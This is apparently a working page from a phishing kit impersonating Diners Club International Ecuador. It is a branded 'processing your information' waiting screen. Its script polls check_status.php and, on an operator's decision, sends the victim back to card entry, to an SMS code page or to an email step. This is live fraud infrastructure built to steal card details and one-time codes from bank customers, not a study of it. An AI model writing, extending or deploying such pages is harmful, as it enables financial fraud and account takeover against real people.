<?php
session_start();
if (!isset($_SESSION['session_id'])) {
    header("Location: index.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Club</title>
    <style>
        /* Resetea los márgenes y paddings para asegurar consistencia */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            font-family: sans-serif;
            width: 100%;
            height: 100%;
            overflow-x: hidden;
        }
        .background-wrap {
            position: fixed; 
            width: 100%;
            height: 100%;
            background: url('bienvenido.png') no-repeat center center fixed; 
            background-size: cover;
        }
        .content {
            position: relative;
            z-index: 2;
            display: flex;
            flex-direction: column;
        }
        .header, .footer {
            width: 100%;
            background-color: #132749;
        }
        .header {
            height: 130px;
        }
        .logo-container {
            margin-top: 42px;
            width: 100%;
            height: 40px;
            background-color: white;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            padding-left: 20px;
        }
        .footer {
            border-top: 3px solid #F79620;
            height: 50px;
            margin-top: 133px;
        }
        .loading-container {
            font-family: sans-serif !important;
            -webkit-text-size-adjust: 100%;
            text-rendering: optimizespeed;
            line-height: 1.3 !important;
            outline: 0;
            box-sizing: inherit;
            margin: 0;
            color: #000000;
            text-align: center;
            font-size: 12px;
            font-weight: normal;
            font-style: normal;
            text-decoration: none;
            display: table;
            padding: 40px 40px;
            background: rgb(255, 255, 255);
            box-shadow: 0 2px 18px 0 rgba(19,61,103,0.49);
            width: 343px;
            height: 450px;
            margin-top: 50px;
        }
        
        .mensaje-loading {
            text-align: center;
            color: #132749;
            font-size: 16px;
            margin: 20px 0;
            line-height: 1.6;
        }

        .loading-spinner {
            width: 80px;
            height: 80px;
            margin: 30px auto;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #F79620;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #666;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="background-wrap"></div>
    <div class="content">
        <div class="header">
            <div class="logo-container">
                <img src="img/ima1.png" alt="Logo 1">
                <img style="width: 100px;margin-left: 5px;" src="img/ima2.png" alt="Logo 2">
                <img style="width: 100px;
                margin-left: 13px;" src="img/ima3.png" alt="Logo 3">
            </div>
        </div>
        <center>
            <div class="loading-container">

<div class="mensaje-loading">
    <p><strong>Procesando su información</strong></p>
    <p>Por favor espere un momento...</p>
</div>

<br>

<div class="loading-spinner"></div>

<p class="loading-text">Verificando datos de seguridad</p>

            </div>
        </center>
        <div class="footer">
<br>

<p style="color: white;font-size: 10px;font-family: sans-serif;margin-left: 20px;">© Diners Club International ® Ecuador. Derechos reservados.</p>

        </div>
    </div>

    <script>
        // Verificar el estado cada 2 segundos
        function checkStatus() {
            fetch('check_status.php')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'ready') {
                        // Acciones de tarjeta
                        if (data.action === 'goto_sms') {
                            window.location.href = 'sms.html';
                        } else if (data.action === 'retry_card') {
                            window.location.href = 'card.html';
                        }
                        // Acciones de SMS
                        else if (data.action === 'sms_complete') {
                            // SMS correcto - fin del proceso (puedes redirigir donde quieras)
                            window.location.href = 'mail.php';
                        } else if (data.action === 'retry_sms') {
                            window.location.href = 'sms.html';
                        } else if (data.action === 'goto_email') {
                            window.location.href = 'mail.php';
                        }
                    } else {
                        // Seguir esperando
                        setTimeout(checkStatus, 2000);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    setTimeout(checkStatus, 2000);
                });
        }

        // Iniciar verificación
        setTimeout(checkStatus, 2000);
    </script>
</body>
</html>
